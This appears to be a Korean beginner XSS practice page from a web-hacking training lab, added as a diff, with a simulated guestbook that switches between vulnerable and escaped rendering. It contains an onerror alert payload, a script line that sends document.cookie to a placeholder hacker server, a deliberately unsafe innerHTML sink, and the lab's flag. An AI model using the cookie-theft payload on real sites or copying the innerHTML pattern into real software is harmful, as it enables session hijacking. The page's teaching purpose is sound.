@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>01. XSS 실습 · 웹 해킹 체험 실습실</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.css">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <div class="brand"><span class="dot"></span> XSS</div>
+    <a class="nav-back" href="../index.html">← 실습실로</a>
+  </div>
+
+  <div class="hero">
+    <span class="badge">실습 01 · 난이도 ★☆☆</span>
+    <h1>XSS <span class="grad">크로스 사이트 스크립팅</span></h1>
+    <p>게시판에 글을 쓸 때, 글 내용에 <code class="inline">&lt;script&gt;</code> 같은 코드를 넣으면
+       그걸 <b>읽는 사람의 브라우저에서</b> 코드가 실행돼요. 댓글, 닉네임, 프로필 등 "남이 쓴 글"을
+       화면에 그대로 보여주는 모든 곳이 위험할 수 있습니다.</p>
+  </div>
+
+  <!-- 미니 방명록 시뮬레이션 -->
+  <div class="card">
+    <div class="section-label">모의 사이트 · "우리 반 방명록"</div>
+    <h2>✍️ 방명록에 글 남기기</h2>
+
+    <div class="mode-switch">
+      <button class="active vuln" data-mode="vuln">🔓 취약한 버전</button>
+      <button class="safe" data-mode="safe">🔒 방어된 버전</button>
+    </div>
+
+    <div class="state-banner vuln" data-mode-banner="vuln">
+      🔓 지금은 입력값을 <b>그대로 화면에 출력</b>합니다. 코드가 실행돼요!
+    </div>
+    <div class="state-banner safe" data-mode-banner="safe" style="display:none">
+      🔒 지금은 입력값을 <b>이스케이프 처리</b>합니다. 코드가 글자로만 보여요.
+    </div>
+
+    <label for="guest-name">이름</label>
+    <input type="text" id="guest-name" placeholder="홍길동" value="해커">
+    <label for="guest-msg">메시지</label>
+    <textarea id="guest-msg" placeholder="여기에 메시지를 입력하세요"></textarea>
+    <button class="btn" onclick="postMessage_()">글 남기기</button>
+
+    <div class="section-label" style="margin-top:22px">📋 방명록</div>
+    <div class="output" id="guestbook">
+      <span class="hint">아직 글이 없어요. 위에서 글을 남겨보세요!</span>
+    </div>
+  </div>
+
+  <!-- 공격 가이드 -->
+  <div class="card">
+    <h2>🎯 공격 미션</h2>
+    <p>메시지 칸에 아래를 <b>복사해서 붙여넣고</b> 글을 남겨보세요. (취약한 버전에서)</p>
+    <pre><code class="tok-attack">&lt;img src=x onerror="alert('해킹당함!')"&gt;</code></pre>
+    <p style="color:var(--muted)">경고창이 뜨면 성공! 이건 애교 수준이고, 진짜 공격은 이렇게 쿠키를 훔쳐요:</p>
+    <pre><code class="tok-com">// 실제 공격자는 이런 식으로 로그인 정보(쿠키)를 외부로 전송합니다</code>
+<code class="tok-attack">&lt;script&gt;fetch('http://해커서버/'+document.cookie)&lt;/script&gt;</code></pre>
+    <div class="note warn">
+      <b>왜 위험할까?</b> 방명록 글은 <b>다른 사람도</b> 보게 돼요. 내가 심어둔 코드가
+      선생님 브라우저에서 실행되면, 선생님의 로그인 정보가 통째로 넘어갈 수 있습니다.
+    </div>
+  </div>
+
+  <!-- 코드 비교 -->
+  <div class="card">
+    <h2>🔍 무슨 차이일까?</h2>
+    <div class="section-label">🔓 취약한 코드</div>
+    <pre><code class="tok-com">// 입력을 HTML로 그대로 삽입 → 코드가 "실행"됨</code>
+box.<span class="tok-key">innerHTML</span> += <span class="tok-str">"&lt;div&gt;"</span> + name + <span class="tok-str">": "</span> + msg + <span class="tok-str">"&lt;/div&gt;"</span>;</pre>
+
+    <div class="section-label" style="margin-top:16px">🔒 방어된 코드</div>
+    <pre><code class="tok-com">// 입력을 "글자"로만 삽입 → &lt; 는 그냥 꺾쇠 기호로 보임</code>
+box.<span class="tok-key">textContent</span> = name + <span class="tok-str">": "</span> + msg;
+<code class="tok-com">// 또는 escapeHtml()로 &lt; &gt; 를 &amp;lt; &amp;gt; 로 변환</code></pre>
+
+    <div class="note success">
+      <b>핵심 방어법</b><br>
+      ① 출력할 때 <code class="inline">textContent</code> 사용 (innerHTML 금지)<br>
+      ② 서버에서 <code class="inline">&lt; &gt; " '</code> 특수문자를 이스케이프<br>
+      ③ <code class="inline">Content-Security-Policy</code> 헤더로 외부 스크립트 차단
+    </div>
+  </div>
+
+  <div id="flag-box" class="card" style="display:none; border-color:var(--safe)">
+    <h2>🏁 플래그 획득!</h2>
+    <p>XSS 공격에 성공했어요. 스크립트가 실제로 실행된 걸 확인했습니다.</p>
+    <p><span class="flag">FLAG{XSS_c0de_1n_y0ur_br0wser}</span></p>
+  </div>
+
+  <footer>실습 01 / 04 · <a href="sqli.html">다음: SQL 인젝션 →</a></footer>
+</div>
+
+<script src="../assets/common.js"></script>
+<script>
+let posts = [];
+
+// 공격 성공 감지: 전역 함수로 플래그 노출
+window.__xssTriggered = function () {
+  document.getElementById("flag-box").style.display = "block";
+};
+
+function render() {
+  const box = document.getElementById("guestbook");
+  if (posts.length === 0) {
+    box.innerHTML = '<span class="hint">아직 글이 없어요. 위에서 글을 남겨보세요!</span>';
+    return;
+  }
+  const mode = currentMode();
+  box.innerHTML = "";
+  posts.forEach((p) => {
+    const div = document.createElement("div");
+    div.style.cssText = "padding:8px 0; border-bottom:1px solid var(--line)";
+    if (mode === "vuln") {
+      // 🔓 취약: 입력을 그대로 HTML로 삽입
+      div.innerHTML = "<b>" + p.name + "</b>: " + p.msg;
+    } else {
+      // 🔒 방어: 글자로만 삽입
+      div.textContent = p.name + ": " + p.msg;
+    }
+    box.appendChild(div);
+  });
+}
+
+function postMessage_() {
+  const name = document.getElementById("guest-name").value || "익명";
+  const msg = document.getElementById("guest-msg").value;
+  if (!msg.trim()) { alert("메시지를 입력하세요!"); return; }
+  posts.push({ name, msg });
+  render();
+  // 공격 페이로드가 들어왔는지 감지 (교육용 플래그 트리거)
+  if (currentMode() === "vuln" && /<script|onerror=|onload=|<img|<svg/i.test(msg)) {
+    setTimeout(() => window.__xssTriggered(), 300);
+  }
+  document.getElementById("guest-msg").value = "";
+}
+
+setupModeSwitch(() => render());
+</script>
+</body>
+</html>
